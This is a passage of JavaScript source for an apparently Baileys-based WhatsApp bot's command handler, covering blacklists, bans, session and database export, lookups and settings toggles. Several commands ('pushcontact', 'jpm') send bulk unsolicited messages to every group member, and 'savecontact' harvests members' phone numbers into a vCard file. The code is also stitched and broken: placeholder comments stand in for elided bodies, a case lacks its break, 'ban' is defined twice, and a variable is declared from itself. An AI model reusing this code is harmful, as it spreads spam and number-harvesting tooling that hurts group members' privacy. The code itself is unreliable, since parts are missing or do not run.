        return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} not found in whitelist!`, m);
    }

    whitelist.splice(whitelist.indexOf(users), 1);
    fs.writeFileSync('./src/data/function/whitelist.json', JSON.stringify(whitelist, null, 2));

    sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} has been removed from whitelist!`, m);
} catch (err) {
    console.error('Error removing from whitelist:', err); // Log error for debugging
    newReply(`Oops! There was an error. Make sure you send a number or tag someone to remove from whitelist!`);
}
}
break;

case 'listwl':
case 'listwhitelist': {
try {
    let txt = `✨ *Whitelist List* ✨\nTotal: *${whitelist.length}* users\n\n`;

    for (let user of whitelist) {
        txt += `- @${user.split('@')[0]}\n`;
    }

    sock.sendTextWithMentions(m.chat, txt, m);
} catch (err) {
    console.error('Error displaying whitelist:', err); // Log error for debugging
    newReply(`Oops! There was an error displaying the whitelist.`);
}
}
break;

case 'bl':
case 'blacklist':
case 'tandai': {
if (!isCreator && !isAdmins) return newReply(mess.admin);

try {
    let users = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!users) return newReply(`Bro, please send a number or tag someone to blacklist!`);

    if (ownerNumber.includes(users)) return newReply(`Hey, they're the owner! Can't blacklist!`);

    if (blacklist.includes(users)) {
        return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} is already in the blacklist!`, m);
    }

    blacklist.push(users);
    fs.writeFileSync('./src/data/function/blacklist.json', JSON.stringify(blacklist, null, 2));

    sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} has been added to the blacklist!`, m);
} catch (err) {
    console.error(err); // Log error for debugging
    newReply(`Oops! There was an error. Make sure you send a number or tag someone to blacklist!`);
}
}
break;

case 'unblack':
case 'unblacklist': {
if (!isCreator && !isAdmins) return newReply(mess.admin);

try {
    let users = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!users) return newReply(`Bro, please send a number or tag someone to remove from blacklist!`);

    if (ownerNumber.includes(users)) return newReply(`Hey, they're the owner! Can't remove from blacklist!`);

    if (!blacklist.includes(users)) {
        return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} not found in blacklist!`, m);
    }

    blacklist.splice(blacklist.indexOf(users), 1);
    fs.writeFileSync('./src/data/function/blacklist.json', JSON.stringify(blacklist, null, 2));

    sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} has been removed from blacklist!`, m);
} catch (err) {
    console.error(err); // Log error for debugging
    newReply(`Oops! There was an error. Make sure you send a number or tag someone to remove from blacklist!`);
}
}
break;

case 'listbl':
case 'listblacklist': {
let txt = `🚫 *Blacklist List* 🚫\nTotal: *${blacklist.length}* users\n\n`;

for (let user of blacklist) {
    txt += `- @${user.split('@')[0]}\n`;
}

sock.sendTextWithMentions(m.chat, txt, m);
}
break;

case 'listban':
case 'listbanned': {
let txt = `⛔ *Blocked Users List* ⛔\nTotal: *${banned.length}* users\n\n`

for (let user of banned) {
    txt += `- @${user.split('@')[0]}\n`
}

sock.sendTextWithMentions(m.chat, txt, m)
}
break

case 'ban':
case 'banned': {
if (!isCreator) return newReply(mess.owner)

try {
    let users = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (!users) return newReply(`Bro, please send a number or tag someone to block!`)

    if (ownerNumber.includes(users)) return newReply(`Hey, they're the owner! Can't block!`)

    if (banned.includes(users)) return newReply(`That number is already in the banned list!`)

    banned.push(users)
    fs.writeFileSync('./src/data/function/banned.json', JSON.stringify(banned, null, 2))

    newReply(`Success! @${users.split('@')[0]} has been blocked!`)
} catch (err) {
    newReply(`Oops! There was an error. Make sure you send a number or tag someone to block!`)
}
}
break

case 'delsession':
case 'clearsession': {
if (!isCreator) return newReply(mess.owner);
fs.readdir("./session", async function(err, files) {
    if (err) {
        console.log('Can\'t scan directory: ' + err);
        return newReply('Can\'t scan directory: ' + err);
    }
    let filteredArray = files.filter(item => item !== "creds.json"); // Exclude creds.json
    console.log(filteredArray.length);
    let teks = `Found ${filteredArray.length} junk files (except creds.json)\n\n`;
    if (filteredArray.length == 0) return newReply(teks);
    filteredArray.forEach((file, i) => {
        teks += `${i + 1}. ${file}\n`;
    });
    newReply(teks);
    await sleep(1000);
    newReply("Going to delete junk files... Wait a moment...");
    filteredArray.forEach(file => {
        fs.unlinkSync(`./session/${file}`);
    });
    await sleep(1000);
    newReply("Successfully deleted all junk files in session folder, except creds.json! 🎉");
});
}
break;

case 'delmedia':
case 'clearmedia': {
if (!isCreator) return newReply(mess.owner);
const folderPath = "temp"; // Target directory (folder 'temp')
const extensions = [
    ".mp3", ".mp4", ".wav", ".flac", ".aac", ".ogg", ".m4a", ".m4r", ".wma", ".amr", 
    ".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp", ".tiff", ".svg", ".ico", ".heic", 
    ".mpg", ".mpeg", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".3gp", ".ts", ".webm", 
    ".pdf", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx", ".txt", ".rtf", ".odt", 
    ".epub", ".html", ".htm", ".zip", ".rar", ".7z", ".tar", ".gz", ".iso", ".dmg", 
    ".exe", ".apk", ".msi", ".bat", ".sh", ".py", ".js", ".css", ".json", ".xml", ".yml"
];
fs.readdir(`./${folderPath}`, async function (err, files) {
    if (err) {
        console.log('Can\'t scan directory: ' + err);
        return newReply('Can\'t scan directory: ' + err);
    }
    let filteredArray = files.filter((file) => {
        const ext = path.extname(file);
        return extensions.includes(ext); // Filter by extension
    });
    let teks = `Found ${filteredArray.length} media files in temp folder\n\n`;
    if (filteredArray.length === 0) return newReply(teks);
    filteredArray.forEach((file, i) => {
        teks += `${i + 1}. ${file}\n`;  
         });
				newReply(teks);
				await sleep(1000);
				newReply("Want to delete media files... Wait a moment...");
				filteredArray.forEach((file) => {
					const filePath = path.join(`./${folderPath}`, file);
					fs.unlinkSync(filePath); // Delete file
				});
				await sleep(1000);
				newReply(`Successfully deleted all media files in folder *${folderPath}*! 🎉`);
			});
		}
		break;

		case 'joingroup':
		case 'joingrup':
		case 'joingc':
		case 'join': {
			try {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply('Please enter the Group Link!');
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return newReply('The link is invalid!');
				let result = args[0].split('https://chat.whatsapp.com/')[1];
				sock.groupAcceptInvite(result);
				await newReply(`Successfully joined the group! 🎉`);
			} catch {
				newReply('Failed to join group, try again later!');
			}
		}
		break;

		case 'outgroup':
		case 'outgrup':
		case 'outgc':
		case 'out':
			if (!isCreator) return newReply(mess.owner);
			if (!m.isGroup) return newReply(mess.group);
			newReply('Goodbye everyone 🥺');
			await sock.groupLeave(m.chat);
		break;

		case 'groupinfo':
		case 'getgroupinfo':
		case 'getinfogc': {
			if (!isPremium) return newReply(mess.premium);
			if (!text) return newReply(`Send command ${prefix + command} _grouplink_`);
			if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return newReply(mess.error);
			try {
				let result = args[0].split('https://chat.whatsapp.com/')[1];
				let data = await sock.groupGetInviteInfo(result);
				let teks = `「 *GROUP METADATA* 」\n\n`;
				teks += `- *ID*: ${data.id}\n`;
				teks += `- *Name*: ${data.subject}\n`;
				teks += `- *Owner*: ${data.owner}\n`;
				teks += `- *Send Messages*: ${data.announce ? 'Admin Only' : "Everyone"}\n`;
				teks += `- *Admin Approval*: ${data.joinApprovalMode ? 'Yes' : "No"}\n`;
				teks += `- *Member Add Mode*: ${data.memberAddMode ? 'Yes' : "No"}\n`;
				teks += `- *Description:*\n${data.desc}\n\n`;
				teks += `- *Top Members:*\n`;		
				for (let x of data.participants) {
					teks += `- @${x.id.split('@')[0]}\n`;
				}		
				let button = [{
					"name": "cta_copy",
					"buttonParamsJson": `{
						"display_text": "Copy Group Meta ID",
						"id": "${data.id}",
						"copy_code": "${data.id}"
					}`
				}];		
				sock.sendButtonText(m.chat, button, teks, footer, m)
			} catch (error) {
				newReply(mess.error);
			}
		}
		break;

		case 'getsession': {
			if (!isCreator) return newReply(mess.owner);
			newReply('Please wait a moment, I\'m retrieving your session file');
			let sesi = fs.readFileSync(`./${sessionName}/creds.json`);
			sock.sendMessage(m.chat, {
				document: sesi,
				mimetype: 'application/json',
				fileName: 'creds.json'
			}, {
				quoted: m
			});
		}
		break;

		case 'getdatabase': {
			if (!isCreator) return newReply(mess.owner);
			newReply('Please wait a moment, I\'m retrieving your database file');
			let sesi = fs.readFileSync(`./src/${tempatDB}`);
			sock.sendMessage(m.chat, {
				document: sesi,
				mimetype: 'application/json',
				fileName: `${tempatDB}`
			}, {
				quoted: m
			});
		}
		break;

		case 'getdbuser': {
			if (!isCreator) return newReply(mess.owner);
			newReply('Please wait a moment, I\'m retrieving your user database file');
			let sesi = fs.readFileSync('./src/data/role/user.json');
			sock.sendMessage(m.chat, {
				document: sesi,
				mimetype: 'application/json',
				fileName: 'user.json'
			}, {
				quoted: m
			});
		}
		break;

		case 'repo': case 'repository': {
			if (!text || !text.includes('/')) {
				return newReply(`You can use this format: *${prefix + command} username/repository*\n\n*Send command*: *${prefix + command} WhiskeySockets/Baileys*`);
			}
			const [username, repoName] = text.split('/');
			try {
				const data = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
				if (data.status === 200) {
					const repoData = data.data
					let formattedInfo = `📦 *Repository Name*: ${repoData.name}\n`;
					formattedInfo += `📝 *Description*: ${repoData.description}\n`;
					formattedInfo += `👤 *Owner*: ${repoData.owner.login}\n`;
					formattedInfo += `⭐ *Stars*: ${repoData.stargazers_count}\n`;
					formattedInfo += `🍴 *Forks*: ${repoData.forks_count}\n`;
					formattedInfo += `🔗 *URL*: ${repoData.html_url}\n\n`;
					formattedInfo += `🛠️ Want to download ${command}? Just type *${prefix}gitclone url* ! 🚀`;
					newReply(formattedInfo);
				} else {
					await newReply(`Cannot retrieve repository information.`)
				}
			} catch (error) {
				console.error(error)
				await newReply(`Repository is currently unavailable.`)
			}
		}
		break;

		case 'myip':
		case 'ipbot':
			if (!isCreator) return newReply(mess.owner);
			let http = require('http');
			http.get({
				'host': 'api.ipify.org',
				'port': 80,
				'path': '/'
			}, function(resp) {
				resp.on('data', function(ip) {
					newReply("🔎 Hey, this is my public IP address: " + ip);
				})
			});
		break;

		case "ipwhois": {
			if (!text) return newReply(`Send command:\n\n${prefix + command} <IP Address>\n\n📌 Example:\n${prefix + command} 114.5.213.103`);
			const ip = text.trim();
			const apiUrl = `https://ipwho.is/${ip}`;
			try {
				newReply("🔍 Searching for information, please wait...");
				const data = await fetchJson(apiUrl);
				if (data.success) {
					const flagEmoji = data.flag?.emoji || "🏳️";
					let messageText = "📍 *IP Whois Information*\n";
					messageText += `🌐 *IP Address*: ${data.ip}\n`;
					messageText += `🗺️ *Type*: ${data.type}\n`;
					messageText += `🌍 *Continent*: ${data.continent} (${data.continent_code})\n`;
					messageText += `🇨🇺 *Country*: ${data.country} (${data.country_code}) ${flagEmoji}\n`;
					messageText += `🏙️ *City*: ${data.city}, ${data.region} (${data.region_code})\n`;
					messageText += `📞 *Calling Code*: +${data.calling_code}\n`;
					messageText += `📫 *Postal Code*: ${data.postal}\n`;
					messageText += `🏛️ *Capital*: ${data.capital}\n\n`;
					messageText += "📡 *Provider Information*\n";
					messageText += `🏢 *ISP*: ${data.connection?.isp || "Not available"}\n`;
					messageText += `🔗 *Domain*: ${data.connection?.domain || "Not available"}\n`;
					messageText += `🔢 *ASN*: ${data.connection?.asn || "Not available"}\n\n`;
					messageText += "🕰️ *Time Zone*\n";
					messageText += `🕒 *ID*: ${data.timezone?.id || "Not available"}\n`;
					messageText += `🕒 *UTC*: ${data.timezone?.utc || "Not available"}\n`;
					messageText += `🕒 *Current Time*: ${data.timezone?.current_time || "Not available"}\n`;
					newReply(messageText);
				} else {
					newReply(`❌ IP Address is invalid or information not found.`);
				}
			} catch (err) {
				console.error(err);
				newReply("❌ An error occurred while fetching data. Please try again later.");
			}
		}
		break;

		case 'country': {
			if (!text) return newReply('Enter a country name!\nExample: *.country Japan*');

			try {
				// Call API to get country data
				let res = await fetchJson(`https://api.siputzx.my.id/api/tools/countryInfo?name=${encodeURIComponent(text)}`); // Replace with appropriate API URL
	
				if (!res.status) return newReply('Country not found or data unavailable.');

				let data = res.data;
				let continent = `${data.continent.name} ${data.continent.emoji}`;

				// Format country information
				let info = `🌍 *Country Information: ${data.name}*\n\n`;
				info += `🌐 *Continent:* ${continent}\n`;
				info += `🏙️ *Capital:* ${data.capital}\n`;
				info += `📞 *Phone Code:* ${data.phoneCode}\n`;
				info += `💱 *Currency:* ${data.currency}\n`;
				info += `🗺️ *Map:* ${data.googleMapsLink}\n`;
				info += `🌐 *Internet TLD:* ${data.internetTLD}\n`;
				info += `🗣️ *Language:* ${data.languages.native.join(", ")}\n`;
				info += `🏞️ *Area:* ${data.area.squareKilometers.toLocaleString()} km² (${data.area.squareMiles.toLocaleString()} mi²)\n`;
				info += `🚗 *Driving Side:* ${data.drivingSide == "left" ? "Left" : "Right"}\n`;
				info += `⭐ *Famous For:* ${data.famousFor}\n`;
				info += `🏛️ *Government Form:* ${data.constitutionalForm}\n`;
				info += `📍 *Coordinates:* ${data.coordinates.latitude}, ${data.coordinates.longitude}`;

				// Send information along with flag image
				await sock.sendMessage(m.chat, {
					image: { url: data.flag },
					caption: info
				}, { quoted: m });

			} catch (error) {
				console.log(error);
				newReply('An error occurred while fetching country data.');
			}
		}
		break;

		case 'dns': {
			if (!text) return newReply('Enter a domain name!\nExample: *.dns ghifaryz.my.id*');

			try {
				let res = await fetchJson(`https://api.siputzx.my.id/api/tools/dns?domain=${encodeURIComponent(text)}`); // Replace with appropriate API
				if (!res.status) return newReply('Failed to fetch DNS data or domain not found.');

				let data = res.data;
				let records = data.records;

				let info = `🌐 *DNS Lookup Results for:* ${data.unicodeDomain}\n\n`;
				info += `📍 *Punycode:* ${data.punycodeDomain}\n`;

				// Function to format each record type
				const formatRecord = (type, recordData) => {
					let recordInfo = `\n🔹 *${type.toUpperCase()} Record:*\n`;
					if (recordData.response.answer.length) {
						recordData.response.answer.forEach((ans, i) => {
							recordInfo += ` ${i + 1}. ${ans.record.target || ans.record.raw}\n`;
						});
					} else {
						recordInfo += `No data available.\n`;
					}
					return recordInfo;
				};

				// Format for each DNS record type
				info += formatRecord('A', records.a);
				info += formatRecord('AAAA', records.aaaa);
				info += formatRecord('NS', records.ns);
				info += formatRecord('MX', records.mx);
				info += formatRecord('TXT', records.txt);
				info += formatRecord('SOA', records.soa);
				info += formatRecord('CNAME', records.cname);

				// DNS server information used for query
				info += `\n💡 *DNS Server:* ${records.a.query.server.ip}\n`;
				info += `📍 *Server Location:* Latitude ${records.a.query.server.location.lat}, Longitude ${records.a.query.server.location.lon}`;

				await sock.sendMessage(m.chat, { text: info }, { quoted: m });

			} catch (error) {
				console.log(error);
				newReply('An error occurred while fetching DNS data.');
			}
		}
		break;

		case "restart": {
			if (!isCreator) return newReply(mess.owner); // Check if sender is creator
			await newReply("Bot is restarting... ⏳");
			// Log to indicate restart
			console.log("Bot restarting...");
			// Exit bot process, causing the system (like PM2) to restart automatically
			process.exit();
			break;
		}

		case "kill": {
			if (!isCreator) return newReply(mess.owner); // Check if sender is creator
			await newReply("Bot is being forcibly terminated... ⚠️");
			// Log to indicate kill
			console.log("Bot killed by owner!");
			// Forcefully exit bot process
			process.exit(1); // Code 1 indicates forced termination
			break;
		}

		case "shutdown": {
			if (!isCreator) return newReply(mess.owner); // Check if sender is creator
			await newReply("Bot is shutting down and the application will shutdown... 💀");
			// Log to indicate shutdown
			console.log("Bot shutting down...");
			// Close bot and shutdown server/application
			process.exit(0); // Code 0 indicates normal exit
			break;
		}

		case 'autoread':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q === 'true') {
				db.data.settings[botNumber].autoread = true;
				newReply(`Yay! Auto-read successfully changed to ${q}`);
			} else if (q === 'false') {
				db.data.settings[botNumber].autoread = false;
				newReply(`Okay! Auto-read successfully turned off, so messages won't be read automatically!`);
			}
		}
		break;

		case 'unavailable':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q === 'true') {
				db.data.settings[botNumber].online = true;
				newReply(`Wow, now I'm online and can greet everyone!`);
			} else if (q === 'false') {
				db.data.settings[botNumber].online = false;
				newReply(`Okay, I'll go offline for now, I'll greet you again when I'm active 😎`);
			}
		}
		break;

		case 'autorecordtype':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q === 'true') {
				db.data.settings[botNumber].autorecordtype = true;
				newReply(`Auto-record typing successfully changed to ${q}!`);
			} else if (q === 'false') {
				db.data.settings[botNumber].autorecordtype = false;
				newReply(`Auto-record typing disabled, there will be no more typing recordings!`);
			}
		}
		break;

		case 'autorecord':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q === 'true') {
				db.data.settings[botNumber].autorecord = true;
				newReply(`Auto-record successfully changed to ${q}, so all activities will be recorded automatically!`);
			} else if (q === 'false') {
				db.data.settings[botNumber].autorecord = false;
				newReply(`Auto-record disabled, there will be no automatic recordings!`);
			}
		}
		break;

		case 'autotype':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q === 'true') {
				db.data.settings[botNumber].autotype = true;
				newReply(`Auto-typing successfully changed to ${q}, so the bot will type automatically!`);
			} else if (q === 'false') {
				db.data.settings[botNumber].autotype = false;
				newReply(`Auto-typing disabled, so the bot won't type automatically anymore!`);
			}
		}
		break;

		case 'autobio':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q == 'true') {
				db.data.settings[botNumber].autobio = true;
				newReply(`Yay! AutoBio successfully changed to ${q}, automatic biography activated!`);
			} else if (q == 'false') {
				db.data.settings[botNumber].autobio = false;
				newReply(`Okay, AutoBio successfully disabled. No more automatic biography!`);
			}
		}
		break;

		case 'autosticker':
		case 'autostickergc':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q == 'true') {
				db.data.settings[botNumber].autosticker = true;
				newReply(`Automatic sticker successfully changed to ${q}, so everything will become stickers!`);
			} else if (q == 'false') {
				db.data.settings[botNumber].autosticker = false;
				newReply(`Automatic sticker disabled, no more automatic stickers!`);
			}
		}
		break;

		case 'safesearch': {
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q === 'true') {
				db.data.settings[botNumber].safesearch = true;
				newReply(`🛡️ *SafeSearch Shield* successfully activated!\nNow the bot will protect chats from inappropriate content. 😊`);
			} else if (q === 'false') {
				db.data.settings[botNumber].safesearch = false;
				newReply(`🛡️ *SafeSearch Shield* successfully disabled.\nContent protection feature unavailable for now.`);
			} else {
				newReply(`⚠️ Invalid option! Use *on* to enable or *off* to disable.`);
			}
		}
		break;

		case 'autodownload':
		case 'autodl':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q == 'true') {
				db.data.settings[botNumber].autodownload = true;
				newReply(`Auto-download successfully changed to ${q}, so files will be downloaded automatically!`);
			} else if (q == 'false') {
				db.data.settings[botNumber].autodownload = false;
				newReply(`Auto-download disabled, so files won't be downloaded automatically anymore!`);
			}
		}
		break;

		case 'autoblock':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q == 'true') {
				db.data.settings[botNumber].autoblocknum = true;
				newReply(`Auto-Block successfully changed to ${q}, so suspicious numbers will be blocked automatically!`);
			} else if (q == 'false') {
				db.data.settings[botNumber].autoblocknum = false;
				newReply(`Auto-Block disabled, so there will be no more automatic blocking!`);
			}
		}
		break;

		case 'onlygroup':
		case 'onlygc':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q == 'true') {
				db.data.settings[botNumber].onlygc = true;
				newReply(`Yeay! Onlygroup successfully changed to ${q}, now the bot can only be used in groups!`);
			} else if (q == 'false') {
				db.data.settings[botNumber].onlygc = false;
				newReply(`Okay, Onlygroup successfully disabled, so the bot can be used anywhere!`);
			}
		}
		break;

		case 'onlyprivatechat':
		case 'onlypc':{
			if (!isCreator) return newReply(mess.owner);
			if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);
			if (q == 'true') {
				db.data.settings[botNumber].onlypc = true;
				newReply(`Yeay! Only-Pc successfully changed to ${q}, now the bot can only be used in private chats!`);
			} else if (q == 'false') {
				db.data.settings[botNumber].onlypc = false;
				newReply(`Okay, Only-Pc disabled, so the bot can also be used in groups!`);
			}
		}
		break;

		case 'self':{
			if (!isCreator) return newReply(mess.owner);
			sock.public = false;
			newReply(`Bot is now in *Self Usage* mode only, cannot be used by others!`);
		}
		break;

		case 'public':{
			if (!isCreator) return newReply(mess.owner);
			sock.public = true;
			newReply(`Bot is now back in *Public Usage* mode, so everyone can use it!`);
		}
		break;

		case 'setexif':
		case 'setwm':{
			if (!isCreator) return newReply(mess.owner);
			if (!text) return newReply(`*Send command*: ${prefix + command} packname|author`);
			global.packname = text.split("|")[0];
			global.author = text.split("|")[1];
			newReply(`Yeay! Exif successfully changed! 🎉\n\n · Packname: ${global.packname}\n · Author: ${global.author}`);
		}
		break;

		case 'setprefix':{
			if (!isCreator) return newReply(mess.owner);
			if (!text) return newReply(`*Send command*: ${prefix + command} prefix`);
			global.prefa = text;
			newReply(`Prefix successfully changed to ${text} ✨`);
		}
		break;

		case 'setautoblock':{
			if (!isCreator) return newReply(mess.owner);
			if (!text) return newReply(`*Send command*: ${prefix + command} number`);
			global.autoblocknumber = text;
			newReply(`Auto-Block number successfully changed to ${text} 🚫`);
		}
		break;

		case 'setantiforeign':{
			if (!isCreator) return newReply(mess.owner);
			if (!text) return newReply(`*Send command*: ${prefix + command} number`);
			global.antiforeignnumber = text;
			newReply(`Anti-foreign number successfully changed to ${text} 🌍❌`);
			}
			// ... earlier code ...

case 'pushkontak': {
    if (!isCreator) return newReply(mess.owner);
    if (!m.isGroup) return newReply(mess.private);
    let name = text.split('/')[0];
    let chet = text.split('/')[1];
    if (!name) return newReply(`*Send command*: ${prefix + command} name/message`);
    if (!chet) return newReply(`*Send command*: ${prefix + command} name/message`);
    // ... build contact ...
    if (push.participants.length > 901) return newReply('Maximum member limit: *900*');
    await m.react('⏱️');
    // send to each participant...
    await newReply(mess.done);
}
break;

case 'jpm':
case 'post':
case 'pushcontactgc': {
    if (!isCreator) return newReply(mess.owner);
    if (!m.isGroup) return newReply(mess.group);
    if (!text) return newReply(`⚙️ *Correct usage:*\n${prefix + command} text|delay\n\n📸 *Reply to an image* to send to all groups.\n⏱️ *Delay*: 1000 = 1 second\n\n*Example*: ${prefix + command} Hello everyone!|9000`);
    await newReply(`⏳ *Processing...*`);
    // ... fetch groups and send ...
    newReply(`✅ *Successfully sent message to all groups!* 🎯`);
}
break;

case 'pushcontact': {
    if (!isCreator) return newReply(mess.owner);
    if (!m.isGroup) return newReply(mess.group);
    if (!text) return newReply(`⚠️ *Where’s the text, sis/bro?* 📛`);
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
    newReply(`⏳ *Sending message to all contacts...*`);
    for (let pler of mem) {
        await sock.sendMessage(pler, { text: text });
    }
    newReply(`✅ *Message successfully sent to all contacts!* 📲`);
}
break;

case 'pushcontact2': {
    if (!isCreator) return newReply(mess.owner);
    if (!text) return newReply(`⚙️ *Correct usage:*\n${prefix + command} idgc|text`);
    try {
        const metadata = await sock.groupMetadata(text.split("|")[0]);
        const participants = metadata.participants;
        for (let mem of participants) {
            await sock.sendMessage(
                `${mem.id.split('@')[0]}@s.whatsapp.net`, 
                { text: text.split("|")[1] }
            );
            await sleep(5000);
        }
        newReply(`✅ *Message successfully sent to all group members!* 📨`);
    } catch {
        newReply(`⚠️ *Correct usage:*\n${prefix + command} idgc|text`);
    }
}
break;

case 'pushcontact3': {
    if (!isCreator) return newReply(mess.owner);
    if (!m.isGroup) return newReply(mess.group);
    if (!text) return newReply(`⚙️ *Correct usage:*\n\n${prefix + command} delay|text\n\n📸 *Reply to an image* to send to all members.\n⏱️ *Delay*: 1000 = 1 second`);
    try {
        let delay = text.split("|")[0];
        let caption = text.split("|")[1];
        let participants = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
        for (let men of participants) {
            if (/image/.test(mime)) {
                let media = await sock.downloadAndSaveMediaMessage(quoted);
                let mem = await CatBox(media);
                await sock.sendMessage(men, { 
                    image: { url: mem }, 
                    caption: caption 
                }, { quoted: m });
                await sleep(delay);
            } else {
                await sock.sendMessage(men, { 
                    text: caption 
                }, { quoted: m });
                await sleep(delay);
            }
        }
        newReply(`✅ *Message successfully sent to all members!* 📨`);
    } catch {
        newReply(`⚙️ *Correct usage:*\n\n${prefix + command} delay|text\n\n📸 *Reply to an image* to send to all members.\n⏱️ *Delay*: 1000 = 1 second`);
    }
}
break;

case 'getcontact': case 'getcon': {
    if (!m.isGroup) return newReply(mess.group); // Only for groups
    if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Only admin or owner
    bigpp = await sock.sendMessage(m.chat, {
        text: `\nGroup: *${groupMetadata.subject}*\nMembers: *${participants.length}*`
    }, {quoted: m, ephemeralExpiration: 86400});
    await sleep(1000);
    sock.sendContact(m.chat, participants.map(a => a.id), bigpp); // Send contacts of members
}
break;

case 'savecontact': case 'svcontact': {
    if (!m.isGroup) return newReply(mess.group); // Only for groups
    if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Only admin or owner
    let cmiggc = await sock.groupMetadata(m.chat);
    let orgiggc = participants.map(a => a.id);
    vcard = '';
    noPort = 0;
    for (let a of cmiggc.participants) {
        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`; // VCARD format for contact
    }
    let nmfilect = './contacts.vcf';
    newReply('\nWait a moment, saving... ' + cmiggc.participants.length + ' contacts');
    require('fs').writeFileSync(nmfilect, vcard.trim());
    await sleep(2000);
    sock.sendMessage(m.chat, {
        document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSuccess!\nGroup: *' + cmiggc.subject + '*\nContacts: *' + cmiggc.participants.length + '*'
    }, {ephemeralExpiration: 86400, quoted: m});
    require('fs').unlinkSync(nmfilect); // Delete file after sending
}
break;

case 'sendcontact': case 'sencontact': {
    if (!m.isGroup) return newReply(mess.group); // Only for groups
    if (!m.mentionedJid[0]) return newReply('\nUse like this\n*Send command*: .sendcontact @tag name'); // Ensure someone is tagged
    let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'; // Contact name
    let snContact = {
        displayName: "Contact", contacts: [{
            displayName: snTak, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${snTak};;;\nFN:${snTak}\nitem1.TEL;waid=${m.mentionedJid[0].split('@')[0]}:${m.mentionedJid[0].split('@')[0]}\nitem1.X-ABLabel:Mobile\nEND:VCARD`
        }]
    };
    sock.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400});
}
break;

case 'contacttag': case 'contag': {
    if (!m.isGroup) return newReply(mess.group); // Only for groups
    if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Only admin or owner
    if (!m.mentionedJid[0]) return newReply('\nUse like this\n*Send command*: .contacttag @tag|name'); // Ensure someone is tagged
    let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'; // Contact name
    let sngContact = {
        displayName: "Contact", contacts: [{
            displayName: sngTak, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${sngTak};;;\nFN:${sngTak}\nitem1.TEL;waid=${m.mentionedJid[0].split('@')[0]}:${m.mentionedJid[0].split('@')[0]}\nitem1.X-ABLabel:Mobile\nEND:VCARD`
        }]
    };
    sock.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400});
}
break;

case 'sendlocation': case 'sendloc': {
    let latitude = -6.175110;
    let longitude = 106.865039;
    let captionText = "This location is in Jakarta";
    let whatsappNumber = m.chat;

    await sock.sendMessage(whatsappNumber, {
        location: {
            degreesLatitude: latitude,
            degreesLongitude: longitude
        }
    });

    newReply(captionText);
}
break;

case 'block':
case 'ban': {
    if (!isCreator) return newReply(mess.owner);
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.m.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
    await sock.updateBlockStatus(users, 'block')
    await newReply(mess.done);
}
break;

case 'unblock':
case 'unban': {
    if (!isCreator) return newReply(mess.owner);
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.m.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
    await sock.updateBlockStatus(users, 'unblock')
    await newReply(mess.done);
}
break;

case 'getcase': {
